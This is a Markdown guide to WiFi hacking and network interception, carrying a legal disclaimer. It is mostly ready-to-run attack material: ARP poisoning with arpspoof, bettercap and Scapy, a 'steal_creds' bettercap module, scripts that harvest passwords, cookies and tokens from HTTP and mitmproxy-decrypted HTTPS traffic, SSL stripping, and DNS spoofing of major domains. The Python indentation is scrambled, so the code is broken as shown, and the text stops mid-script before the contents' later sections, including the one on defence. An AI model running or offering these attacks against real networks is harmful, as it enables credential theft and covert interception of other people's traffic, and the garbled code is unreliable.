# 📡 WiFi Hacking & Network Interception — Complete Guide
### Own Your Network: Monitor, Intercept, and Analyze Every Device

> **Legal Notice:** Everything in this guide applies to networks **you own or have explicit written permission to test.** Intercepting traffic on networks you don't own is illegal in most countries. Use this on your home WiFi, a lab setup, or authorized penetration testing engagements only.

> **Who is this for?** You want to understand everything happening on your WiFi network — see every device, intercept every request, analyze traffic, find vulnerabilities, and understand how WiFi security works at a deep level.

---

## 📚 Table of Contents

1. [How WiFi Actually Works](#1-how-wifi-actually-works)
2. [Setting Up Your Attack Lab](#2-setting-up-your-attack-lab)
3. [WiFi Adapter and Monitor Mode](#3-wifi-adapter-and-monitor-mode)
4. [Network Reconnaissance — Discover Everything](#4-network-reconnaissance)
5. [ARP Poisoning — Intercept Every Device](#5-arp-poisoning)
6. [Man-in-the-Middle (MITM) Attack](#6-man-in-the-middle-mitm)
7. [Intercepting HTTP Traffic](#7-intercepting-http-traffic)
8. [Intercepting HTTPS Traffic](#8-intercepting-https-traffic)
9. [DNS Spoofing](#9-dns-spoofing)
10. [Capturing and Analyzing All Traffic](#10-capturing-and-analyzing-all-traffic)
11. [WiFi Security Analysis](#11-wifi-security-analysis)
12. [WPA2 Handshake Capture](#12-wpa2-handshake-capture)
13. [Monitoring Specific Devices](#13-monitoring-specific-devices)
14. [Building a Full Network Monitor](#14-building-a-full-network-monitor)
15. [Defending Your Network](#15-defending-your-network)
16. [Tools Reference](#16-tools-reference)

---

## 1. How WiFi Actually Works

Before intercepting anything, you must understand what's happening underneath.

### The Big Picture

```
Your Phone
│
│ WiFi (radio waves, 2.4GHz or 5GHz)
│
┌───▼────────────┐
│   WiFi Router  │ ← The hub of your home network
│   (Access Point│
│    + Switch    │
│    + NAT       │
└───┬────────────┘
│
│ Ethernet / Fiber
│
┌───▼────────────┐
│   Your ISP     │ → Internet
└────────────────┘
```

### What Happens When Your Phone Loads a Website

```
Step 1: DNS Query
Phone → Router → ISP DNS Server
"What is the IP address of google.com?"
Answer: 142.250.80.46

Step 2: TCP Connection
Phone → Router → Google's server
"Hello, I want to connect" (TCP handshake)

Step 3: TLS Handshake (for HTTPS)
Phone ↔ Google
Exchange encryption keys, verify certificate

Step 4: HTTP Request
Phone → Google: "GET /search?q=hello HTTP/1.1"

Step 5: Response
Google → Phone: HTML page

All of this flows through YOUR ROUTER.
If you control the router or sit between a device and the router,
you can see (and modify) all of it.
```

### IP Addresses and MAC Addresses

```
MAC Address:
- Hardware address burned into every network adapter
- Looks like: AA:BB:CC:DD:EE:FF
- Unique per device (usually)
- Works at Layer 2 (local network only)
- Example: Your phone's WiFi chip has a MAC address

IP Address:
- Logical address assigned by router (DHCP)
- Looks like: 192.168.1.105
- Can change (DHCP lease)
- Works at Layer 3 (routable globally)

Private IP ranges (your home network):
192.168.0.0 - 192.168.255.255  ← Most common home routers
10.0.0.0    - 10.255.255.255   ← Also common
172.16.0.0  - 172.31.255.255   ← Less common

Your router is usually: 192.168.1.1 or 192.168.0.1
Your devices get: 192.168.1.100, 192.168.1.101, etc.
```

### ARP — The Protocol That Makes Interception Possible

ARP (Address Resolution Protocol) is the bridge between IP and MAC addresses.

```
When your phone wants to send data to 192.168.1.1 (router):
Phone broadcasts: "WHO HAS 192.168.1.1? Tell 192.168.1.105"
Router replies:   "192.168.1.1 is at AA:BB:CC:DD:EE:FF"
Phone saves this in its ARP cache and sends data directly to that MAC

The vulnerability:
ARP has NO AUTHENTICATION.
Anyone can say "192.168.1.1 is at MY MAC ADDRESS"
The phone believes it and sends traffic to YOU instead!
This is ARP Poisoning / ARP Spoofing.
```

### Why WiFi Makes Interception Easier

On WiFi, all devices share the same physical medium (radio waves):

```
Wired network:   Device A ──wire──▶ Switch ──wire──▶ Device B
(Switch isolates traffic — A can't see B's data)

WiFi network:    Device A ──radio──▶ ──radio──▶ Device B
(All in same airspace — with right adapter,
 you can see EVERYONE'S traffic!)
```

---

## 2. Setting Up Your Attack Lab

### What You Need

```
Hardware:
✓ A computer running Linux (Kali Linux recommended)
✓ WiFi adapter that supports monitor mode + packet injection
(Your laptop's built-in WiFi usually does NOT support this)

Recommended adapters:
- Alfa AWUS036ACH (~$40)  ← Best overall, USB, works great
- Alfa AWUS036NH  (~$25)  ← Cheaper, 2.4GHz only
- TP-Link TL-WN722N v1 (~$15) ← Cheap, check version! v1 only
- Panda PAU09 (~$20)  ← Good alternative

Software:
✓ Kali Linux (best for this — has all tools pre-installed)
Download: kali.org
Options: Install as main OS, VM, or live USB

Or on regular Ubuntu/Debian:
sudo apt install aircrack-ng wireshark bettercap \
nmap arpspoof dsniff mitmproxy \
python3-scapy net-tools
```

### Setting Up Kali Linux

```bash
# Option 1: Run Kali in VirtualBox (easiest to start)
# Download VirtualBox: virtualbox.org
# Download Kali VM: kali.org/get-kali/#kali-virtual-machines
# Import the .ova file into VirtualBox
# IMPORTANT: Plug in USB WiFi adapter → Devices → USB → Select your adapter

# Option 2: Kali Live USB (run without installing)
# Download Kali ISO: kali.org
# Write to USB: sudo dd if=kali.iso of=/dev/sdX bs=4M
# Boot from USB

# Option 3: Install alongside Windows (dual boot)

# Update Kali after setup
sudo apt update && sudo apt upgrade -y

# Install extra tools
sudo apt install -y bettercap mitmproxy python3-pip \
wireshark tshark aircrack-ng \
nmap netdiscover dsniff
```

### Understanding Your Network

Before attacking, map your environment:

```bash
# Find your own IP and network info
ip addr show
# or older command:
ifconfig

# Example output:
# eth0: 192.168.1.150/24  ← Your wired IP
# wlan0: 192.168.1.151/24 ← Your wireless IP
# Gateway (router): 192.168.1.1

# Find the gateway (router IP)
ip route show default
# or:
route -n
# Look for: 0.0.0.0  192.168.1.1  ← That's your router

# Quick network scan to see all devices
sudo nmap -sn 192.168.1.0/24
# Shows all alive hosts on your network
```

---

## 3. WiFi Adapter and Monitor Mode

### Why You Need a Special Adapter

Normal WiFi mode = **Managed mode**
- Your adapter only receives packets addressed TO YOU
- Everything else is ignored at hardware level

Monitor mode = **Promiscuous mode for WiFi**
- Your adapter captures ALL packets in the air
- Every device's traffic is visible to you
- You can also inject fake packets

### Enabling Monitor Mode

```bash
# Check your adapter name
iwconfig
# Look for wlan0, wlan1, etc.

# Method 1: Using airmon-ng (recommended)
# Install aircrack-ng suite
sudo apt install aircrack-ng

# Kill processes that interfere
sudo airmon-ng check kill
# This kills NetworkManager and wpa_supplicant
# Your internet will stop working on this adapter!

# Enable monitor mode
sudo airmon-ng start wlan0
# Creates: wlan0mon (monitor interface)

# Verify it worked
iwconfig wlan0mon
# Should show: Mode:Monitor

# Method 2: Manual
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
iwconfig wlan0  # Verify Mode:Monitor

# Method 3: Using iw
sudo iw dev wlan0 set type monitor

# Stop monitor mode (return to normal)
sudo airmon-ng stop wlan0mon
# or:
sudo ip link set wlan0mon down
sudo iw wlan0mon set type managed
sudo ip link set wlan0mon up
```

### Testing Monitor Mode Works

```bash
# Scan for all WiFi networks around you
sudo airodump-ng wlan0mon

# You should see output like:
# BSSID              PWR  Beacons  #Data  CH  ENC   ESSID
# AA:BB:CC:DD:EE:FF  -45  100      50     6   WPA2  MyHomeWiFi
# 11:22:33:44:55:66  -72  40       10     11  WPA2  Neighbor_WiFi
# ...

# Each line is a WiFi network visible from your location!
# PWR = signal strength (closer to 0 = stronger)
# CH = channel
# ENC = encryption type
# ESSID = network name

# Also shows connected clients:
# STATION            PWR  Rate  Lost  Frames  ESSID
# CC:DD:EE:FF:00:11  -50  54e   0     100     MyHomeWiFi
```

### Packet Injection Test

```bash
# Test if your adapter can inject packets
sudo aireplay-ng --test wlan0mon

# Output should show:
# Injection is working!
# If not, your adapter doesn't support injection
```

---

## 4. Network Reconnaissance

### Discover All Devices on Your Network

```bash
# Method 1: Nmap scan (most thorough)
sudo nmap -sn 192.168.1.0/24

# Output:
# Nmap scan report for 192.168.1.1
#   Host is up (0.0010s latency).
#   MAC Address: AA:BB:CC:DD:EE:FF (TP-Link)
# Nmap scan report for 192.168.1.100
#   Host is up (0.045s latency).
#   MAC Address: 11:22:33:44:55:66 (Apple)
# Nmap scan report for 192.168.1.101
#   Host is up (0.12s latency).
#   MAC Address: 22:33:44:55:66:77 (Samsung)

# Method 2: netdiscover (ARP-based, fast)
sudo netdiscover -i eth0 -r 192.168.1.0/24

# Output shows:
#  IP            At MAC Address     Count     Len  MAC Vendor
#  192.168.1.1   aa:bb:cc:dd:ee:ff      5     300  TP-Link
#  192.168.1.100 11:22:33:44:55:66      3     180  Apple Inc.
#  192.168.1.101 22:33:44:55:66:77      2     120  Samsung

# Method 3: arp-scan
sudo apt install arp-scan
sudo arp-scan --localnet

# Method 4: Check router's DHCP table
# Login to router admin page (usually 192.168.1.1)
# Look for "Connected Devices" or "DHCP Clients"
```

### Get Detailed Information About Each Device

```bash
# Detailed scan with OS detection and services
sudo nmap -A -T4 192.168.1.100

# Output includes:
# - Open ports
# - Services running
# - OS guess
# - Script scan results

# Example output:
# PORT     STATE SERVICE VERSION
# 22/tcp   open  ssh     OpenSSH 8.2
# 80/tcp   open  http    nginx 1.18
# 443/tcp  open  https   nginx 1.18
# 8080/tcp open  http    Apache Tomcat 9.0
#
# OS: Linux 4.15 - 5.6

# Scan specific device for all ports
sudo nmap -p- 192.168.1.100
# -p- means scan all 65535 ports

# Fast scan (top 1000 ports)
sudo nmap -F 192.168.1.100

# Scan entire network for a specific port (e.g., web servers)
sudo nmap -p 80,443,8080 192.168.1.0/24
```

### Identify Device Types

```bash
# MAC address vendor lookup
# First 3 bytes of MAC = manufacturer OUI

# Look up manually:
# https://macvendors.com/
# or:
# https://macaddress.io/

# With nmap (shows vendor automatically)
sudo nmap -sn 192.168.1.0/24

# Common vendors you'll see:
# Apple      → iPhones, MacBooks, iPads
# Samsung    → Android phones, TVs, tablets
# TP-Link    → Routers, switches
# Espressif  → ESP8266/ESP32 IoT devices
# Shenzhen   → Generic Chinese IoT devices
# Amazon     → Echo, Fire TV, Kindle
# Google     → Chromecast, Nest, Pixel
# Microsoft  → Xbox, Surface
```

### Build a Device Inventory

```python
# network_inventory.py
import subprocess
import re
import json
from datetime import datetime

def scan_network(network="192.168.1.0/24"):
"""Scan network and return device list"""

# Run nmap
cmd = ["sudo", "nmap", "-sn", "--oX", "-", network]
result = subprocess.run(cmd, capture_output=True, text=True)

devices = []

# Parse XML output
import xml.etree.ElementTree as ET
root = ET.fromstring(result.stdout)

for host in root.findall('host'):
	device = {}
	
	# Get IP
	for addr in host.findall('address'):
		if addr.get('addrtype') == 'ipv4':
			device['ip'] = addr.get('addr')
			elif addr.get('addrtype') == 'mac':
			device['mac'] = addr.get('addr')
			device['vendor'] = addr.get('vendor', 'Unknown')
			
			# Get hostname
			hostnames = host.find('hostnames')
			if hostnames is not None:
				hostname = hostnames.find('hostname')
				if hostname is not None:
					device['hostname'] = hostname.get('name')
					
					if 'ip' in device:
						device['seen'] = datetime.now().isoformat()
						devices.append(device)
						
						return devices
						
						def print_inventory(devices):
						print(f"\n{'='*60}")
						print(f"NETWORK INVENTORY - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
						print(f"{'='*60}")
						print(f"{'IP':<16} {'MAC':<19} {'Vendor':<25} {'Hostname'}")
						print(f"{'-'*80}")
						
						for d in sorted(devices, key=lambda x: x.get('ip', '')):
							ip = d.get('ip', 'Unknown')
							mac = d.get('mac', 'Unknown')
							vendor = d.get('vendor', 'Unknown')[:24]
							hostname = d.get('hostname', '')
							print(f"{ip:<16} {mac:<19} {vendor:<25} {hostname}")
							
							print(f"\nTotal devices: {len(devices)}")
							
							devices = scan_network()
							print_inventory(devices)
							
							# Save to file
							with open('network_inventory.json', 'w') as f:
							json.dump(devices, f, indent=2)
							```
							
							---
							
							## 5. ARP Poisoning
							
							This is the core technique for intercepting traffic from any device on your network.
							
							### What ARP Poisoning Does
							
							```
							NORMAL traffic flow:
							Phone (192.168.1.100) → Router (192.168.1.1) → Internet
							Phone's ARP table: "192.168.1.1 is at router's MAC"
							
							AFTER ARP POISONING:
							You send fake ARP replies to Phone:
							"192.168.1.1 is at YOUR MAC"
							
							You send fake ARP replies to Router:
							"192.168.1.100 is at YOUR MAC"
							
							Now traffic flows:
							Phone → YOU → Router → Internet
							Phone thinks it's talking to router
							Router thinks it's talking to phone
							YOU see and can modify everything!
							
							This is called a Man-in-the-Middle (MITM) attack.
							```
							
							### Setting Up IP Forwarding
							
							Before ARP poisoning, enable IP forwarding — otherwise traffic dies at your machine:
							
							```bash
							# Enable IP forwarding (traffic passes through you to real destination)
							echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
							
							# Make it permanent (survives reboot)
							echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
							sudo sysctl -p
							
							# Verify it's enabled
							cat /proc/sys/net/ipv4/ip_forward
							# Should output: 1
							```
							
							### ARP Poisoning with arpspoof
							
							```bash
							# Install dsniff (includes arpspoof)
							sudo apt install dsniff
							
							# Syntax: arpspoof -i [interface] -t [target] -r [gateway]
							# -i = network interface
							# -t = target device IP (the one you want to intercept)
							# -r = router IP
							
							# VARIABLES (replace with your values):
							# YOUR_INTERFACE = eth0 or wlan0 (your connected interface)
							# TARGET_IP      = 192.168.1.105 (device to intercept)
							# ROUTER_IP      = 192.168.1.1   (your router)
							
							# Terminal 1: Poison target (tell target: "router is at MY mac")
							sudo arpspoof -i eth0 -t 192.168.1.105 192.168.1.1
							
							# Terminal 2: Poison router (tell router: "target is at MY mac")
							sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.105
							
							# Now ALL traffic from that device flows through you!
							# Keep both terminals running.
							
							# To intercept ALL devices on the network:
							# arpspoof -i eth0 192.168.1.1   (no -t = target everyone)
							# Use carefully — can disrupt the whole network!
							```
							
							### ARP Poisoning with a Python Script
							
							```python
							# arp_poison.py — More control over ARP poisoning
							from scapy.all import *
							import time
							import sys
							
							def get_mac(ip):
							"""Get MAC address of an IP using ARP request"""
							arp_request = ARP(pdst=ip)
							broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
							arp_request_broadcast = broadcast / arp_request
							answered = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
							
							if answered:
								return answered[0][1].hwsrc
								return None
								
								def poison_arp(target_ip, spoof_ip, target_mac):
								"""
								Send fake ARP reply.
								Tells target_ip that spoof_ip is at OUR MAC address.
								"""
								packet = ARP(
									op=2,           # 2 = ARP reply
									pdst=target_ip, # Who we're sending to
									hwdst=target_mac, # Target's MAC
									psrc=spoof_ip   # We claim to be this IP
								)
								send(packet, verbose=False)
								
								def restore_arp(destination_ip, source_ip):
								"""Restore ARP tables to correct state (cleanup)"""
								destination_mac = get_mac(destination_ip)
								source_mac = get_mac(source_ip)
								
								if destination_mac and source_mac:
									packet = ARP(
										op=2,
					  pdst=destination_ip,
					  hwdst=destination_mac,
					  psrc=source_ip,
					  hwsrc=source_mac
									)
									send(packet, count=5, verbose=False)
									
									def start_attack(target_ip, gateway_ip):
									"""Start ARP poisoning attack"""
									print(f"[*] Getting MAC addresses...")
									target_mac = get_mac(target_ip)
									gateway_mac = get_mac(gateway_ip)
									
									if not target_mac:
										print(f"[-] Could not get MAC for {target_ip}")
										return
										if not gateway_mac:
											print(f"[-] Could not get MAC for {gateway_ip}")
											return
											
											print(f"[+] Target:  {target_ip} → {target_mac}")
											print(f"[+] Gateway: {gateway_ip} → {gateway_mac}")
											print(f"[*] Starting ARP poisoning... (Ctrl+C to stop)")
											print(f"[*] Now capturing traffic from {target_ip}")
											
											sent_packets = 0
											try:
											while True:
												# Tell target: gateway IP is at our MAC
												poison_arp(target_ip, gateway_ip, target_mac)
												# Tell gateway: target IP is at our MAC
												poison_arp(gateway_ip, target_ip, gateway_mac)
												
												sent_packets += 2
												print(f"\r[*] Sent {sent_packets} ARP packets", end="")
												time.sleep(2)
												
												except KeyboardInterrupt:
												print(f"\n[*] Stopping... Restoring ARP tables")
												restore_arp(target_ip, gateway_ip)
												restore_arp(gateway_ip, target_ip)
												print("[+] ARP tables restored. Attack stopped.")
												
												# Usage
												if __name__ == "__main__":
													# Enable IP forwarding first!
													import subprocess
													subprocess.run(["echo", "1"], stdout=open("/proc/sys/net/ipv4/ip_forward", "w"))
													
													target_ip = "192.168.1.105"   # Device to intercept
													gateway_ip = "192.168.1.1"    # Router IP
													start_attack(target_ip, gateway_ip)
													```
													
													---
													
													## 6. Man-in-the-Middle (MITM)
													
													Bettercap is the most powerful MITM framework. It combines ARP poisoning, traffic capture, and modification in one tool.
													
													### Bettercap Setup
													
													```bash
													# Install bettercap
													sudo apt install bettercap
													
													# Update caplets (scripts)
													sudo bettercap -eval "caplets.update; q"
													
													# Start bettercap on your network interface
													sudo bettercap -iface eth0   # wired
													sudo bettercap -iface wlan0  # wireless
													```
													
													### Bettercap Interactive Mode
													
													```bash
													sudo bettercap -iface eth0
													
													# Inside bettercap's interactive shell:
													
													# See all discovered devices
													net.show
													
													# Enable network probing (discover devices)
													net.probe on
													
													# Start ARP spoofing on ALL devices
													set arp.spoof.fullduplex true   # Poison both target and gateway
													set arp.spoof.targets 192.168.1.0/24  # Target entire network
													arp.spoof on
													
													# Or target a specific device
													set arp.spoof.targets 192.168.1.105
													arp.spoof on
													
													# Start packet sniffing
													net.sniff on
													
													# See live HTTP requests
													set net.sniff.verbose true
													net.sniff on
													
													# HTTP proxy (to modify traffic)
													http.proxy on
													
													# HTTPS proxy (with SSL stripping)
													https.proxy on
													```
													
													### Bettercap Caplets (Script Files)
													
													Save these as `.cap` files and run them:
													
													```bash
													# mitm_all.cap — MITM entire network
													set arp.spoof.fullduplex true
													set arp.spoof.targets 192.168.1.0/24
													arp.spoof on
													
													set net.sniff.verbose false
													set net.sniff.output /tmp/captured.pcap
													net.sniff on
													
													http.proxy on
													
													# Run the caplet:
													sudo bettercap -iface eth0 -caplet mitm_all.cap
													```
													
													```bash
													# steal_creds.cap — Capture credentials
													set arp.spoof.fullduplex true
													set arp.spoof.targets 192.168.1.105
													
													# HTTP proxy to capture credentials
													set http.proxy.script steal_creds.js
													http.proxy on
													
													arp.spoof on
													net.sniff on
													```
													
													```javascript
													// steal_creds.js — Bettercap JS module
													// Intercept and log POST requests with credentials
													
													function onRequest(req, res) {
														// Log all POST request bodies
														if (req.Method == "POST") {
															var body = req.Body;
															
															// Look for credential fields
															if (body.indexOf("password") >= 0 ||
																body.indexOf("passwd") >= 0 ||
																body.indexOf("login") >= 0) {
																
																log("=== CREDENTIALS FOUND ===");
															log("URL: " + req.Hostname + req.Path);
															log("Body: " + body);
															log("=========================");
																}
														}
													}
													```
													
													---
													
													## 7. Intercepting HTTP Traffic
													
													HTTP traffic is unencrypted — easiest to intercept.
													
													### Using Wireshark to Capture HTTP
													
													```bash
													# Start capture with Wireshark
													# While ARP poisoning is running:
													sudo wireshark -i eth0
													
													# Filter for HTTP
													# Type in filter box: http
													
													# See POST requests (login forms)
													# Filter: http.request.method == "POST"
													
													# See specific host
													# Filter: http.host contains "example.com"
													
													# Follow stream to see full conversation
													# Right-click packet → Follow → HTTP Stream
													```
													
													### Using tcpdump to Capture HTTP
													
													```bash
													# Capture all HTTP while MITM is active
													sudo tcpdump -i eth0 -A -s 0 'tcp port 80' | \
													grep -E "GET|POST|Host:|Cookie:|Authorization:|password|login"
													
													# Save to file for later analysis
													sudo tcpdump -i eth0 -w /tmp/http_capture.pcap 'tcp port 80'
```

### Extract Credentials from HTTP Traffic

```python
# http_credential_sniffer.py
from scapy.all import *
import re

def packet_callback(pkt):
if pkt.haslayer(TCP) and pkt.haslayer(Raw):
	data = pkt[Raw].load.decode('utf-8', errors='ignore')
	
	# Only look at HTTP POST requests
	if 'POST' in data:
		src_ip = pkt[IP].src
		dst_ip = pkt[IP].dst
		
		print(f"\n[+] POST Request: {src_ip} → {dst_ip}")
		
		# Extract host
		host_match = re.search(r'Host: ([^\r\n]+)', data)
		if host_match:
			print(f"    Host: {host_match.group(1)}")
			
			# Extract body (after double newline)
			if '\r\n\r\n' in data:
				body = data.split('\r\n\r\n', 1)[1]
				print(f"    Body: {body[:500]}")
				
				# Look for credential patterns
				patterns = {
					'username': r'(?:user(?:name)?|login|email|uid)=([^&\s]+)',
	 'password': r'(?:pass(?:word)?|passwd|pwd)=([^&\s]+)',
				}
				
				for field, pattern in patterns.items():
					match = re.search(pattern, body, re.IGNORECASE)
					if match:
						print(f"    *** {field.upper()}: {match.group(1)} ***")
						
						# Also capture cookies
						if 'Cookie:' in data:
							cookie_match = re.search(r'Cookie: ([^\r\n]+)', data)
							if cookie_match:
								print(f"\n[Cookie] {pkt[IP].src}: {cookie_match.group(1)[:100]}")
								
								# Start sniffing (while ARP poisoning is active)
								print("[*] Sniffing HTTP traffic... (Ctrl+C to stop)")
								sniff(iface="eth0", prn=packet_callback,
									  filter="tcp port 80", store=0)
								```
								
								---
								
								## 8. Intercepting HTTPS Traffic
								
								HTTPS is encrypted, but you can still intercept it with SSL stripping or by becoming a trusted CA.
								
								### Method 1: SSL Stripping
								
								SSL stripping downgrades HTTPS to HTTP:
								
								```
								Normal:  Client → HTTPS → Server (encrypted)
								Stripped: Client → HTTP → YOU → HTTPS → Server
								↑ Client thinks it's HTTP!
								↑ You see everything in plaintext
								```
								
								```bash
								# Method 1: Using bettercap's https.proxy
								sudo bettercap -iface eth0
								
								# In bettercap:
								set arp.spoof.targets 192.168.1.105
								arp.spoof on
								
								# Enable SSL stripping
								set https.proxy.sslstrip true
								https.proxy on
								net.sniff on
								```
								
								```bash
								# Method 2: Using sslstrip tool
								sudo apt install sslstrip
								
								# Set up iptables to redirect HTTPS traffic to sslstrip
								sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
								
								# Start sslstrip
								sudo sslstrip -l 8080 -w /tmp/sslstrip.log
								
								# In another terminal, start ARP poisoning
								sudo arpspoof -i eth0 -t 192.168.1.105 192.168.1.1 &
								sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.105 &
								
								# Read the log
								tail -f /tmp/sslstrip.log
								```
								
								**Limitation:** HSTS (HTTP Strict Transport Security) prevents SSL stripping on major sites. Modern browsers also warn about this.
								
								### Method 2: mitmproxy with Custom CA
								
								Install your own CA certificate on target device, then decrypt all HTTPS:
								
								```bash
								# Start mitmproxy
								mitmproxy --mode transparent --listen-port 8080
								
								# Or mitmdump (no GUI, logs to terminal)
								mitmdump --mode transparent --listen-port 8080
								
								# Set up iptables routing (while ARP poisoning target)
								sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
								sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
								
								# mitmproxy generates a CA cert at:
								# ~/.mitmproxy/mitmproxy-ca-cert.pem
								
								# Install this cert on target device:
								# Android: Settings → Security → Install Certificate
								# iOS: Settings → General → Profile → Install
								# Windows: Certificates → Trusted Root Certification Authorities
								
								# After cert is installed: ALL HTTPS traffic is decrypted!
								```
								
								### Method 3: mitmproxy Script — Intercept and Modify
								
								```python
								# mitm_full.py — Complete MITM script
								from mitmproxy import http
								import json
								import re
								from datetime import datetime
								
								class FullMITM:
								
								def __init__(self):
								self.log_file = open('/tmp/mitm_log.txt', 'w')
								self.credentials = []
								
								def request(self, flow: http.HTTPFlow):
								"""Called for every HTTP/HTTPS request"""
								
								timestamp = datetime.now().strftime('%H:%M:%S')
								url = flow.request.pretty_url
								
								# Log all requests
								self.log_file.write(f"[{timestamp}] {flow.request.method} {url}\n")
								self.log_file.flush()
								
								# Print interesting requests
								if any(keyword in url.lower() for keyword in
									['login', 'auth', 'signin', 'api', 'token']):
									print(f"\n[REQUEST] {flow.request.method} {url}")
									
									# Log headers
									for name, value in flow.request.headers.items():
										if name.lower() in ['authorization', 'cookie', 'x-api-key']:
											print(f"  {name}: {value}")
											
											# Log body
											if flow.request.content:
												body = flow.request.content.decode('utf-8', errors='ignore')
												print(f"  Body: {body[:500]}")
												
												# Look for credentials in POST body
												cred_patterns = {
													'username': r'(?:user(?:name)?|login|email)=([^&\s]+)',
	 'password': r'(?:pass(?:word)?|passwd|pwd)=([^&\s]+)',
												}
												
												for field, pattern in cred_patterns.items():
													match = re.search(pattern, body, re.IGNORECASE)
													if match:
														cred = {
															'time': timestamp,
															'url': url,
															'field': field,
															'value': match.group(1)
														}
														self.credentials.append(cred)
														print(f"  *** {field.upper()}: {match.group(1)} ***")
														
														def response(self, flow: http.HTTPFlow):
														"""Called for every HTTP/HTTPS response"""
														
														# Look for tokens in responses
														if flow.response.content:
															try:
															data = json.loads(flow.response.content)
															
															# Look for auth tokens
															for key in ['token', 'access_token', 'jwt', 'session', 'api_key']:
																if key in data:
																	print(f"\n[TOKEN FOUND] {key}: {data[key]}")
																	
																	except:
																	pass
																	
																	# Look for passwords in responses (bad practice by servers!)
																	body = flow.response.content.decode('utf-8', errors='ignore')
																	if 'password' in body.lower() and flow.response.status_code == 200:
																		print(f"\n[RESPONSE WITH PASSWORD] {flow.request.pretty_url}")
																		print(f"  {body[:200]}")
																		
																		addons = [FullMITM()]
																		
																		# Run with: mitmdump -s mitm_full.py --mode transparent -p 8080
																		```
																		
																		---
																		
																		## 9. DNS Spoofing
																		
																		DNS spoofing lets you redirect any domain to your own server.
																		
																		### How DNS Spoofing Works
																		
																		```
																		Normal:
																		Device asks: "What is the IP of google.com?"
																		DNS server replies: "142.250.80.46"
																		Device connects to Google
																		
																		Spoofed:
																		YOU intercept the DNS query (via ARP poisoning)
																		YOU reply: "google.com is at 192.168.1.200" (your machine!)
																		Device connects to YOUR machine instead!
																		
																		Use cases:
																		- Redirect HTTP traffic to your proxy
																		- Serve a fake login page (phishing on your own test devices)
																		- Block certain domains (parental controls!)
																		- Redirect IoT devices to local server
																		```
																		
																		### DNS Spoofing with bettercap
																		
																		```bash
																		sudo bettercap -iface eth0
																		
																		# In bettercap:
																		# First enable ARP spoofing
																		set arp.spoof.targets 192.168.1.105
																		arp.spoof on
																		
																		# Configure DNS spoofing
																		# Redirect all domains to your machine (192.168.1.200)
																		set dns.spoof.all true
																		set dns.spoof.address 192.168.1.200
																		dns.spoof on
																		
																		# Or redirect specific domains only
																		set dns.spoof.domains google.com,facebook.com
																		set dns.spoof.address 192.168.1.200
																		dns.spoof on
																		
																		# Now start a web server on your machine
																		# Any request to google.com will land on your machine!
																		python3 -m http.server 80
																		```
																		
																		### DNS Spoofing with dnsspoof
																		
																		```bash
																		# Create hosts file for spoofing
																		cat > /tmp/dns_spoof.txt << EOF
																		192.168.1.200   google.com
																		192.168.1.200   *.google.com
																		192.168.1.200   facebook.com
																		192.168.1.200   *.facebook.com
																		EOF
																		
																		# Start dnsspoof
																		sudo dnsspoof -i eth0 -f /tmp/dns_spoof.txt
																		
																		# Combined with arpspoof:
																		sudo arpspoof -i eth0 -t 192.168.1.105 192.168.1.1 &
																		sudo dnsspoof -i eth0 -f /tmp/dns_spoof.txt
																		```
																		
																		### DNS Spoofing with Python
																		
																		```python
																		# dns_spoof.py — Custom DNS spoofer
																		from scapy.all import *
																		
																		# Domains to spoof and their fake IPs
																		SPOOF_MAP = {
																			'google.com': '192.168.1.200',
	 'facebook.com': '192.168.1.200',
	 'update.microsoft.com': '0.0.0.0',  # Block updates
	 # Add any domain you want to redirect
																		}
																		
																		def dns_spoof(pkt):
																		"""Intercept DNS queries and send fake responses"""
																		
																		if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # DNS query
																			queried_name = pkt[DNS].qd.qname.decode().rstrip('.')
																			
																			# Check if we should spoof this domain
																			for domain, fake_ip in SPOOF_MAP.items():
																				if queried_name == domain or queried_name.endswith('.' + domain):
																					
																					print(f"[DNS SPOOF] {pkt[IP].src} asked for {queried_name} → {fake_ip}")
																					
																					# Build fake DNS response
																					spoofed = (
																						IP(dst=pkt[IP].src, src=pkt[IP].dst) /
																						UDP(dport=pkt[UDP].sport, sport=53) /
																						DNS(
																							id=pkt[DNS].id,
						  qr=1,           # This is a response
						  aa=1,           # Authoritative answer
						  qd=pkt[DNS].qd, # Same question
						  an=DNSRR(
							  rrname=pkt[DNS].qd.qname,
				 ttl=300,
				 rdata=fake_ip
						  )
																						)
																					)
																					
																					send(spoofed, verbose=False)
																					return  # Don't forward original query
																					
																					# Start sniffing for DNS queries
																					# (Run while ARP poisoning is active)
																					print("[*] DNS Spoofer running... (Ctrl+C to stop)")
																					sniff(iface="eth0",
																						  filter="UDP port 53",
						   prn=dns_spoof,
						   store=0)
																					```
																					
																					---
																					
																					## 10. Capturing and Analyzing All Traffic
																					
																					### Capture Everything from a Device
																					
																					```bash
																					# The complete capture setup:
																					
																					# Terminal 1: Enable IP forwarding
																					echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
																					
																					# Terminal 2: ARP poison target
																					sudo arpspoof -i eth0 -t 192.168.1.105 192.168.1.1 &
																					sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.105 &
																					
																					# Terminal 3: Capture ALL traffic
																					sudo tcpdump -i eth0 host 192.168.1.105 -w /tmp/device_traffic.pcap
																					
																					# Let it run for as long as you want
																					# Then analyze in Wireshark:
																					wireshark /tmp/device_traffic.pcap
																					```
																					
																					### Analyze What a Device Communicates With
																					
																					```python
																					# analyze_device.py — Understand what a device does
																					from scapy.all import rdpcap
																					from collections import defaultdict, Counter
																					import socket
																					
																					def analyze_device_traffic(pcap_file, device_ip):
																					packets = rdpcap(pcap_file)
																					
																					connections = defaultdict(lambda: {'bytes': 0, 'packets': 0})
																					dns_queries = []
																					http_requests = []
																					
																					for pkt in packets:
																						if 'IP' not in pkt:
																							continue
																							
																							src = pkt['IP'].src
																							dst = pkt['IP'].dst
																							
																							# Only look at our target device's traffic
